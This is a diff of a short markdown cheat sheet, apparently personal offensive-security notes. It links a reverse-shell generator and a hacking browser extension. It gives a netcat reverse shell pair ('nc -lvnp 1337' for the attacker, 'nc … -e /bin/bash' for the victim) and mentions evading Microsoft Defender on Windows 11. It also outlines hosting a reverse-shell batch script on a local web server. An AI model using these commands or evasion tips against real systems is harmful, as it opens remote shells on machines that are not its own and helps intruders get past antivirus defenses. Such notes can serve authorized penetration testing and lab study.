@@ -3,16 +3,17 @@
 ### Shell Generator Resources(Reverse, Bind, HoaxShell, MSFVenom)
 [Shell Generator](https://www.revshells.com) 
 
-**MAC OS Example:** (Last tested 11/24)
+
+**MAC OS Reverse Shell Example:** (Last tested 11/24)
 
 - Attacker: nc -lvnp 1337
 
 - Victim: nc 192.168.50.53 1337 -e /bin/bash
 
-**Windwos 11 Example:**
+**Windwos 11 Reverse Shell Example:**
 
-- cat & mouse game to bypass defender
-
+- cat & mouse game to bypass Microsoft Defender
+Useful resource: [Youtube](https://www.youtube.com/watch?v=SYM4i474JqM)
 
 ### Browser Extensions
 [Hack-Tools Chrome Extension](https://chromewebstore.google.com/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi)
@@ -23,7 +24,6 @@
 ### Spin Up a local Web Server on Linux (Last tested 11/24)
 To set up a web server and host your script, follow these steps:
 
-Create a PowerShell script:
    ```bash
    touch powershellreverse.bat
    echo "<ShellCode here>" > powershellreverse.bat
